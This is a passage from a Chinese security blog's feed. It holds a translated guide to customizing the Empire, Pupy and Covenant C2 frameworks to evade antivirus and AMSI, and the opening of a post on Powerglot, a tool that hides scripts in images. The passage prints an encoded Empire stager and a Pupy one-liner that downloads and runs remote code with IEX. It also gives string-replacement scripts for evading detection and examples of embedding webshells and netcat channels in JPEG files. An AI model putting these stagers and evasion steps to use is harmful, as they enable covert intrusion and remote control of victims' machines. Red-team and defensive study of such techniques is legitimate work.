AG8AZgB0AC4AUwBoAGEAcgBlAFAAbwBpAG4AdAAuAFcAZQBiAEMAbwBuAHQAcgBvAGwAcwAuAEkAdABlAG0AUABpAGMAawBlAHIARABpAGEAbABvAGcAJwA7ACQAQgAzADkAMAA0AC4ASABFAEEAZABFAFIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAYgAzADkAMAA0AC4AUAByAG8AWABZAD0AWwBTAFkAcwB0AGUAbQAuAE4ARQBUAC4AVwBlAEIAUgBFAFEAVQBFAFMAdABdADoAOgBEAEUARgBBAFUATABUAFcAZQBCAFAAcgBvAHgAeQA7ACQAYgAzADkAMAA0AC4AUAByAE8AWABZAC4AQwBSAEUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwB5AFMAdABlAE0ALgBOAEUAVAAuAEMAcgBlAGQAZQBuAHQASQBBAGwAQwBBAGMAaABFAF0AOgA6AEQAZQBmAGEAVQBsAHQATgBlAHQAdwBPAHIAawBDAFIARQBEAGUATgB0AGkAYQBMAFMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAYgAzADkAMAA0AC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAFkAcwBUAEUATQAuAFQAZQB4AFQALgBFAE4AQwBvAGQASQBuAEcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAFQAQgBZAHQAZQBTACgAJwBHAGUAWABTAFoAbwApAHQARAAyADsAfQBDACwAUgBmADkAWQBqAEoANgBWAF0AewB2AE8AZAAlAEkARQAmACgAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AVQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AE8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABCADMAOQAwADQALgBIAEUAQQBkAGUAUgBzAC4AQQBEAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAEEAYQByAFUAcQBqAGEAUABXAEEAVgBOAD0AbQAyADQAMgBkADYAWAA2AHoAbQBwADgAQQBEAHkAaQB6ADAAMwA4AGQAVQBxAGQARwBwAHMAPQAiACkAOwAkAGQAYQB0AEEAPQAkAEIAMwA5ADAANAAuAEQATwB3AG4AbABvAEEARABEAEEAVABhACgAJABTAEUAUgArACQAVAApADsAJABJAHYAPQAkAEQAYQBUAEEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AEEAPQAkAEQAQQB0AGEAWwA0AC4ALgAkAEQAQQBUAGEALgBsAGUAbgBHAFQAaABdADsALQBKAE8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAQQBUAEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA</span><br></pre></td></tr></table></figure><p>AMSITrigger 返回 <code>[+] AMSI_RESULT_NOT_DETECTED</code>，执行将导致代理连接成功：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/Agent.jpg" alt=""></p><p>Empire 中的所有模块怎么样？他们使用的脚本也被 AMSI 检测到，Empire 使用模块创建新的进程，因此，每次使用模块时，我们都需要一个新的 bypass，我们有两种选择：</p><ul><li>我们可以修改 <code>data/module_source/</code> 目录中的每个 .ps1 文件，以便 AMSI 不会标记任何文件。如果你还修改了默认的 stage2 脚本数据 <code>/agent/stagers/http.ps1</code>，那么你甚至根本不需要任何 AMSI bypass。 这是一项非常大的一次性工作，但是检测变得更加困难。如何修改脚本？ 看看较旧的博客文章；</li><li>我们可以将模块选项 <code>AMSIBypass</code> 和 <code>Obfuscate</code> 设置为 true，以确保不再标记模块。一个不足之处是，通过不禁用脚本块日志记录，检出率非常高。</li></ul><p><img src="https://image.zeronohacker.com/article/2020/11/18/EmpireParameters.jpg" alt=""></p><p>混淆处理对具有给定选项的每个模块都使用 <a href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke-Obfuscation</a>。我个人的经验是，与使用 <code>AMSIBypass</code> 和 <code>Obfuscate</code> 相比，逐个修改每个脚本更有效，更可靠。</p><h2 id="Pupy-C2"><a href="#Pupy-C2" class="headerlink" title="Pupy C2"></a>Pupy C2</h2><p><a href="https://github.com/n1nj4sec/pupy">Pupy C2</a> 有两个非常不错的主要功能，到目前为止，我在其他开源框架中测试中都没有看到过有哪个有这两个好用的功能：</p><ul><li>Windows Payload 使用反射式 DLL 从内存中加载整个 Python 解释器，因此只要添加了依赖库，任何 Python 脚本都可以在内存中加载并执行；</li><li>交互式 shell 模块使得自动完成功能的全功能命令行 shell 程序成为可能，这就像在打开了 cmd 的远程系统上一样；</li><li>支持 linux；</li></ul><p>可在内存中加载并执行 Python 代码，例如 <a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a> 就是这么做，也可作为一个集成模块。在我个人看来，<code>LaZagne</code> 是 Windows 环境下凭据的通行证，使用 <a href="https://github.com/skelsec/pypykatz">pypykatz</a> 来获取 lsass 凭据，浏览器凭据以及一些 sysadmin-tool 凭据。如果有人在未安装 Python 的 Windows 主机上的内存中找到用于执行 LaZagne 的方法 (通过 Powershell 或 .NET 二进制文件)，我会将我的 DMs 都开放，这是我尝试过的许多个人项目中的一个。</p><p>Pupy 还具有从 Android 软件包到 Linux Binaries，Windows PE Executables 和 Powershell 以及 Python oneliners 的多个 stager 选项：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/Pupystagers.jpg" alt=""></p><p>生成 Windows Powershell oneliner 就像 <code>gen -f ps1_oneliner -O windows</code> 一样简单：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/PupyStager.jpg" alt=""></p><p>Pupy 默认使用两个端口，一个用于托管 Payload 的 Web 服务器，另一个用于通过加密通道的传入连接和 C2-Command。Powershell oneliners 只需从 pupy Web 服务器加载脚本，这些脚本非常庞大，因为它们包含整个 Python 解释器。因此，加载 Stage2 有时可能需要一段时间。Web 服务器的 Pupy Powershell 文件位于目录 <code>/root/.config/pupy/data/wwwroot/</code> 中。 让我们看一下名为 7BLd42qxkI 的 Stage1 Payload：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$code</span>=[<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="string">&#x27;aWYgKCRFbnY6UFJPQ0VTU09SX0FSQ0hJVEVDVFVSRSAtZXEgJ0FNRDY0Jyl7IElFWChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC4xMDAuMTMxOjQ0My96UkZ0aElLVElWL0tzb3RYa1Q4WkYnKTsgfSBlbHNlIHsgSUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjEwMC4xMzE6NDQzL3pSRnRoSUtUSVYvekxpRHJHTnpHdCcpOyB9&#x27;</span>));<span class="built_in">iex</span> <span class="variable">$code</span></span><br></pre></td></tr></table></figure><p>Stage2 既不是 x86 也不是 x64，这取决于受害者的系统，并且包含主要的代理代码。Stage2 的大小超过 9MB，因此在这里我不会显示代码，但是我可以解释 pupy 在做什么。</p><p>Pupy 正在通过 <a href="https://raw.githubusercontent.com/n1nj4sec/pupy/unstable/pupy/external/PowerSploit/CodeExecution/Invoke-ReflectivePEInjection.ps1">Invoke-ReflectivePEInjection.ps1</a> 将 C 编译的代理可执行文件加载到内存中。如果你阅读过我以前的博客文章，就知道此脚本已被 AMSI 标记。此脚本及其 AmsiTrigger.exe 是撰写本文时针对 Pupy Powershell Payload 的唯一检测技术。因此，如果将 <code>Invoke-ReflectivePEInjection.ps1</code> 替换为自定义的修改版本，你将不会再遇到任何 AV 问题。我在以前的博客文章 <a href="https://s3cur3th1ssh1t.github.io/Bypass-AMSI-by-manual-modification-part-II/">Bypass AMSI by manual modification part II – Invoke-Mimikatz</a> 里就做了一个，它位于 <a href="https://gist.github.com/S3cur3Th1sSh1t/1bd87a34c2f84fe6695b89ad701f514f">本要点</a> 中。这个我在两个月前就公开了，但是由于它是公开的，所以有了新的触发器：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/PE-Reflect.jpg" alt=""></p><p>更改这些触发器会产生其他新的触发器，AMSITrigger 最近更新了，因此你现在可以通过参数选择 chunk 大小和最大签名大小值。你可以使用这些参数去找所有手动修改的触发器：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/MoreTriggers.jpg" alt=""></p><p>将生成的 AMSI-Clean 脚本复制到相应的 Pupy 位置，然后在 Pupy 主文件夹中运行以下命令以逃避检测：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find ./ -type f -print0 | xargs -0 sed -i &quot;s/Invoke-ReflectivePEInjection/PE-Reflect/g&quot;</span><br><span class="line">find ./ -type f -print0 | xargs -0 sed -i &quot;s/\$PEBytes/\$PupBytes/g&quot;</span><br><span class="line">find ./ -type f -print0 | xargs -0 sed -i &quot;s/\$code/\$script/g&quot;</span><br><span class="line">find ./ -type f -print0 | xargs -0 sed -i &quot;s/\$data/\$encrypted/g&quot;</span><br></pre></td></tr></table></figure><p>编写本文这段时间内，在没有修补 Amsi.dll 的情况下，此方法应该能绕过大多数 AV 厂商的产品。</p><p>逃避 AV 检测的更简单方法是将 AMSI-Bypass 放在 Stage1 脚本的第一行：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/AMSIStage1.jpg" alt=""></p><p>每个模块都能让 Pupy 绕过 AMSI，因为都在同一进程中加载，因此只需其中之一就足够了。</p><h2 id="Covenant"><a href="#Covenant" class="headerlink" title="Covenant"></a>Covenant</h2><p>Covenant 是一个非常直观的 C2-Framework，可在 board 与最重要的 C2-模块一起使用。我现在在 RTO 实验室中使用了大约 2 个月，对此 C2-Framework 有很多感想。它提供的好处如下：</p><ul><li>直观，有易于操作的 GUI；</li><li>在某些情况下，对 GUI 中有关代码部分的修改，针对 Stagers 和 Executor 的修改以及可以轻松集成新插件的选项均会有所帮助；</li><li>可在内存中执行 C# 代码以及运用了 Powerpick 技术的 Powershell 脚本加载能够让 Covenant 可以使用几乎所有相关的开源 Red-Team 工具；</li></ul><p>但是，我错过了功能强大的 Port-Forwarding 选项以及 socks-proxy 模块，这在几种关键情况下都是必需的。在某些情况下，我还经历了整个框架的崩溃，有时只能通过删除整个数据库文件并重新启动框架来解决。这些问题有待解决，所以我希望它们能尽快解决，以确保操作顺利。</p><p>Covenant 可以选择生成多个不同的 stagers。 如果你已经知道 Covenant 并想知道 <code>Otto</code> 而不是 <code>Grunt</code>，请继续阅读。</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/Launchers.jpg" alt=""></p><p>主要的 stagers 包括 InstallUtil-Execution，MSBuild 和 Powershell-Stagers 以及由 <a href="https://github.com/TheWover/donut">donut</a> 生成的 Shellcode 或 .NET 二进制文件。对于旧版 Windows 系统，可以使用 <a href="https://github.com/tyranid/DotNetToJScript">DotNetToJScript</a> 启动器。</p><p>在 GruntHTTP 模板和 GruntSMB 模板中都可以找到与所有 stagers 相关的代码部分，该代码可在 GUI 修改和查看。</p><p>就像我之前写的那篇博客文章一样，我选择了字符串替换方式来逃避 AV 的检测。为了不破坏子模块或嵌入资源 (如 DLL 文件) 的任何功能，我们首先必须备份它们：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">sudo git clone --recurse-submodules https://github.com/cobbr/Covenant /opt/Covenant</span><br><span class="line">cd /opt/Covenant/Covenant/</span><br><span class="line">mv ./Data/AssemblyReferences/ ../AssemblyReferences/</span><br><span class="line">mv ./Data/ReferenceSourceLibraries/ ../ReferenceSourceLibraries/</span><br><span class="line">mv ./Data/EmbeddedResources/ ../EmbeddedResources/</span><br></pre></td></tr></table></figure><p>这次，我考虑要进行尽可能多的更改以便逃避尽可能多的 AV 供应商。Covenant 在代码库中使用的最明显的单词是 <code>Grunt</code> 和 <code>Covenant</code>。替换它们需要更改目录名称以及文件的内容，可以通过以下 bash 脚本完成：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">mv ./Models/Covenant/ ./Models/EasyPeasy/</span><br><span class="line">mv ./Components/CovenantUsers/ ./Components/EasyPeasyUsers/</span><br><span class="line">mv ./Components/Grunts/ ./Components/Ottos/</span><br><span class="line">mv ./Models/Grunts/ ./Models/Ottos/</span><br><span class="line">mv ./Data/Grunt/GruntBridge/ ./Data/Grunt/OttoBridge/</span><br><span class="line">mv ./Data/Grunt/GruntHTTP/ ./Data/Grunt/OttoHTTP/</span><br><span class="line">mv ./Data/Grunt/GruntSMB/ ./Data/Grunt/OttoSMB/</span><br><span class="line">mv ./Components/GruntTaskings/ ./Components/OttoTaskings/</span><br><span class="line">mv ./Components/GruntTasks/ ./Components/OttoTasks/</span><br><span class="line">mv ./Data/Grunt/ ./Data/Otto/</span><br><span class="line">find ./ -type f -print0 | xargs -0 sed -i &quot;s/Grunt/Otto/g&quot;</span><br><span class="line">find ./ -type f -print0 | xargs -0 sed -i &quot;s/GRUNT/OTTO/g&quot;</span><br><span class="line">find ./ -type f -print0 | xargs -0 sed -i &quot;s/grunt/otto/g&quot;</span><br><span class="line">find ./ -type f -print0 | xargs -0 sed -i &quot;s/Covenant/EasyPeasy/g&quot;</span><br><span class="line">find ./ -type f -print0 | xargs -0 sed -i &quot;s/COVENANT/EASYPEASY/g&quot;</span><br><span class="line">find ./ -type f -name &quot;*Grunt*&quot; | while read FILE ; do</span><br><span class="line">newfile=&quot;$(echo $&#123;FILE&#125; |sed -e &quot;s/Grunt/Otto/g&quot;)&quot;;</span><br><span class="line">mv &quot;$&#123;FILE&#125;&quot; &quot;$&#123;newfile&#125;&quot;;</span><br><span class="line">done</span><br><span class="line">find ./ -type f -name &quot;*GRUNT*&quot; | while read FILE ; do</span><br><span class="line">newfile=&quot;$(echo $&#123;FILE&#125; |sed -e &quot;s/GRUNT/OTTO/g&quot;)&quot;;</span><br><span class="line">mv &quot;$&#123;FILE&#125;&quot; &quot;$&#123;newfile&#125;&quot;;</span><br><span class="line">done</span><br><span class="line">find ./ -type f -name &quot;*grunt*&quot; | while read FILE ; do</span><br><span class="line">newfile=&quot;$(echo $&#123;FILE&#125; |sed -e &quot;s/grunt/otto/g&quot;)&quot;;</span><br><span class="line">mv &quot;$&#123;FILE&#125;&quot; &quot;$&#123;newfile&#125;&quot;;</span><br><span class="line">done</span><br><span class="line">find ./ -type f -name &quot;*Covenant*&quot; | while read FILE ; do</span><br><span class="line">newfile=&quot;$(echo $&#123;FILE&#125; |sed -e &quot;s/Covenant/EasyPeasy/g&quot;)&quot;;</span><br><span class="line">mv &quot;$&#123;FILE&#125;&quot; &quot;$&#123;newfile&#125;&quot;;</span><br><span class="line">done</span><br><span class="line">find ./ -type f -name &quot;*COVENANT*&quot; | while read FILE ; do</span><br><span class="line">newfile=&quot;$(echo $&#123;FILE&#125; |sed -e &quot;s/COVENANT/EASYPEASY/g&quot;)&quot;;</span><br><span class="line">mv &quot;$&#123;FILE&#125;&quot; &quot;$&#123;newfile&#125;&quot;;</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>通过更改 <code>Grunt</code> 一词，Covenant 中的几个命令也将被重命名。因此，在这种情况下，必须使用 <code>OttoWMI</code> 代替 <code>GruntWMI</code> 进行横向移动。</p><p>之后，我看了看 <code>GruntHTTP</code> 以及 <code>GruntSMB</code> 模板，还通过 IlSpy 反编译了 Grunt 可执行文件，以检查是否有必要更改它们。这是一个耗时的反复试验过程，因为我经常通过替换破坏某些功能。它产生了一个单词列表，例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Stage0Body</span><br><span class="line">Stage1Body</span><br><span class="line">Stage1Response</span><br><span class="line">Stage2Bytes</span><br><span class="line">ProfileHttp</span><br><span class="line">ExecuteStager</span><br></pre></td></tr></table></figure><p>使用 <a href="https://github.com/matterpreter/DefenderCheck">DefenderCheck</a> 扫描 .NET 二进制文件，发现来自 C2-Web 站点源代码的 base64 编码的 User-Agent，base64 编码的 Hello World 以及类似于 Empire Triggers 的 C2-Server 的 URL 被标记。因此，在打开新的侦听器之前生成新的配置文件很重要：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/ProfileChange.jpg" alt=""></p><p>更改所有个人资料信息后，还有一个触发器：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/GUID.jpg" alt=""></p><p><code>GUID</code> (GrundUserID) 用于 .cs 文件以及 Covenant 的 .razor，.yaml 和 .json 文件。因此，为了避开此触发器，我在所有相应文件中进行了更改：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">find ./ -type f -name &quot;*.cs&quot; -print0 | xargs -0 sed -i &quot;s/GUID/ANOTHERID/g&quot;</span><br><span class="line">find ./ -type f -name &quot;*.razor&quot; -print0 | xargs -0 sed -i &quot;s/GUID/ANOTHERID/g&quot;</span><br><span class="line">find ./ -type f -name &quot;*.json&quot; -print0 | xargs -0 sed -i &quot;s/GUID/ANOTHERID/g&quot;</span><br><span class="line">find ./ -type f -name &quot;*.yaml&quot; -print0 | xargs -0 sed -i &quot;s/GUID/ANOTHERID/g&quot;</span><br><span class="line">find ./ -type f -name &quot;*.cs&quot; -print0 | xargs -0 sed -i &quot;s/guid/anotherid/g&quot;</span><br><span class="line">find ./ -type f -name &quot;*.razor&quot; -print0 | xargs -0 sed -i &quot;s/guid/anotherid/g&quot;</span><br><span class="line">find ./ -type f -name &quot;*.json&quot; -print0 | xargs -0 sed -i &quot;s/guid/anotherid/g&quot;</span><br><span class="line">find ./ -type f -name &quot;*.yaml&quot; -print0 | xargs -0 sed -i &quot;s/guid/anotherid/g&quot;</span><br></pre></td></tr></table></figure><p>更改所有这些值之后，我们必须取回资源文件和子模块。 之后我们可以建立 Covenant：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mv ../AssemblyReferences/ ./Data/ </span><br><span class="line">mv ../ReferenceSourceLibraries/ ./Data/ </span><br><span class="line">mv ../EmbeddedResources/ ./Data/ </span><br><span class="line">dotnet build</span><br></pre></td></tr></table></figure><p><a href="https://gist.github.com/S3cur3Th1sSh1t/bf5935b5bff48f9f63bdbb4bcc9e8e3d">Covenant customize gist</a></p><p>我无法通过字符串替换的方法为 SMBGrunt 更改一个触发器：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/SMBGrunt.jpg" alt=""></p><p>为了解决这个问题，我手动添加了一些空的 <code>Console.Writeline(&quot;&quot;);</code> 相应行之间的语句：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/OttoSMBBypass.jpg" alt=""></p><p>这不是一个很好的解决方案，但是对于逃避的用例来说就足够了。</p><p>顺便说一下，OttoHTTP.exe 登台程序在 Virustotal 上为 21/71 的检测结果，而没有进行进一步的混淆。我认为这是一个非常可靠的结果：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/OttoHTTP.jpg" alt=""></p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>在我的第一篇博客文章中，我们看到了手动更改 Red-Team/Penetrationtesting 工具如何逃避 AV 检测。这次，我们发现 C2-Customization 的过程几乎相同。</p><p>对于 Empire，我们需要更改 bypass 并使用自定义侦听器选项，以及可选地修改脚本模块源代码。</p><p>对于 Pupy，我们只需要创建一个自定义的 <code>Invoke-ReflectivePEInjection.ps1</code> 并修改一些 python 代码，或者添加一个自定义的 AMSI bypass。</p><p>对于 Covenant，我们还需要更改侦听器选项和 Launcher 模板源代码的某些部分以进行规避，但是使用字符串替换构建自定义的版本相对更容易。</p><p>代码库更改得越多，防御者就越难找到受感染的系统。因此，根据攻击者的不同，通过检测明显的字符串来防御恶意软件无济于事。使用字符串替换，你还可以绕过内存扫描。</p><p>我认为逃避 AV 检测就足够了。下一篇博客文章将涵盖不同的主题。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本篇文章翻译自：&lt;a href=&quot;https://s3cur3th1ssh1t.github.io/Customizing_C2_Frameworks/&quot;&gt;Customizing C2-Frameworks for AV-Evasion&lt;/a&gt;&lt;/</summary>
      
    
    
    
    <category term="安全技术" scheme="https://zeronohacker.github.io/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="PowerShell" scheme="https://zeronohacker.github.io/tags/PowerShell/"/>
    
    <category term="C2" scheme="https://zeronohacker.github.io/tags/C2/"/>
    
    <category term="Pupy" scheme="https://zeronohacker.github.io/tags/Pupy/"/>
    
  </entry>
  
  <entry>
    <title>一款具有攻击性编码工具 —— Powerglot</title>
    <link href="https://zeronohacker.github.io/2020/11/02/an-offensive-coding-tool-powerglot/"/>
    <id>https://zeronohacker.github.io/2020/11/02/an-offensive-coding-tool-powerglot/</id>
    <published>2020-11-02T14:16:00.000Z</published>
    <updated>2021-09-19T14:24:26.874Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>工具链接：<a href="https://github.com/mindcrypt/powerglot">https://github.com/mindcrypt/powerglot</a></p></blockquote><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/mindcrypt/powerglot"><img src="https://github-readme-stats.vercel.app/api/pin/?username=mindcrypt&repo=powerglot&theme=blueberry&show_owner=true"/></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><img src="https://image.zeronohacker.com/article/2020/11/02/9e1b4181cdd3676d97e1e9129f63ec15.png" alt=""></p><p>Powerglot 可以编码多种使用 Polyglots 的脚本，比如，具有攻击性的 Powershell 脚本，经过 Powerglot 编码后就不再需要加载程序来运行 Payload 了。在红队演习和进攻性任务中，隐藏 Payload 通常是通过使用隐写术来完成的，这样做的目的是为了有效规避检测，同时也是用 Powershell 开发具有 Payload 脚本最常见技术之一。在最近的恶意软件和 APT 组织就使用了其中一些功能，比如 <strong>APT32</strong>，<strong>APT37</strong>，<strong>Ursnif</strong>，<strong>Powload</strong>，<strong>LightNeuron/Turla</strong>，<strong>Platinum APT</strong>，<strong>Waterbug/Turla</strong>，<strong>Lokibot</strong>，<strong>Dukes</strong>，<strong>Titanium</strong> 等。Powerglot 是基于 Polyglots 的一款多功能、多平台的攻击和防御工具。Powerglot 能将脚本 (powershell，shell，php 等) 隐藏在图片文件中。与通常的攻击性工具和恶意软件不同，Powerglot 不需要任何加载程序即可执行隐藏的信息。Powerglot 在进攻任务中具有明显的实用性，但被定义为新发现的东西或者是蓝队工具。Powerglot 是第一个使用 Polyglots 查找隐藏信息的通用完整开源工具，这些信息对于实现持久性或隐藏恶意软件 (提升权限，横向运动，反弹 shell 等) 很有用。以下为 Powerglot 的特性：</p><ul><li>可将 Powershell、shell 脚本、php 等编码为 Polyglots 图片，不需要加载程序来恢复/执行隐藏的信息 (Payload)，Powerglot 可支持多种格式，主要为 JPEG 和 PDF 格式，其他格式支持正在路上 ……</li><li>Powerglot 是一个完整的开源工具，可以检测 Polyglots，同样也能检测恶意的 Polyglots，特别是某些公开工具 (如 Truepolyglot 或 stegoSploit) 的结果。可在多种格式下工作：JPEG，PNG，GIF，BMP，ZIP，PDF，MP3 等。</li></ul><div class="tip "><p>提示：Polyglots 指的是通晓多种语言的人或物，在文中表示的是使用多种语言编写的脚本文件。</p></div><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/mindcrypt/powerglot</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> powerglot</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> python3 powerglot</span></span><br></pre></td></tr></table></figure><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>以下为 Powerglot 使用 Polyglots 来隐藏 Payload 的一些粟子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Example 1 - Hiding a powershell/php/shell script <span class="keyword">in</span> a JPEG image</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> python3 powerglot.py -o payload.ps1 cat.jpg cat-hidden1.jpg</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> python3 powerglot.py -o webshell.php cat.jpg cat-hidden2.jpg</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> python3 powerglot.py -o shell.sh cat.jpg cat-hidden3.jpg</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Example 2 - Hiding a shell script (linenum.sh) <span class="keyword">for</span> privilege escalation <span class="string">&quot;hidden&quot;</span> <span class="keyword">in</span> a JPEG image</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> python3 powerglot.py -o linenum.sh cat.jpg cat-linenum.jpg</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> file cat-linenum.jpg (It is a valid JPEG file)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> feh cat-lineum.jpg (The image is properly showed <span class="keyword">in</span> an image viewer)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> We can execute the script <span class="keyword">in</span> several ways:</span></span><br><span class="line">a) cat cat-linenum | bash</span><br><span class="line">b) chmod +x cat-linenum.jpeg; ./cat-linenum.jpeg</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Example 3 - Hiding a cover-channel wiht netcat <span class="keyword">in</span> a JPEG image</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Attacker</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&quot;nc 127.0.0.1 4444&quot;</span> &gt; netcat.sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> python3 powerglot.py -o netcat.sh cat.jpeg cat-netcat.jpeg</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> nc -nvlp 4444</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Victim</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> chmod +x cat-netcat.jpg | ./cat-netcat.jpg</span></span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2020/11/02/nc-polyglot.png" alt=""></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Example 4 - Polyglot <span 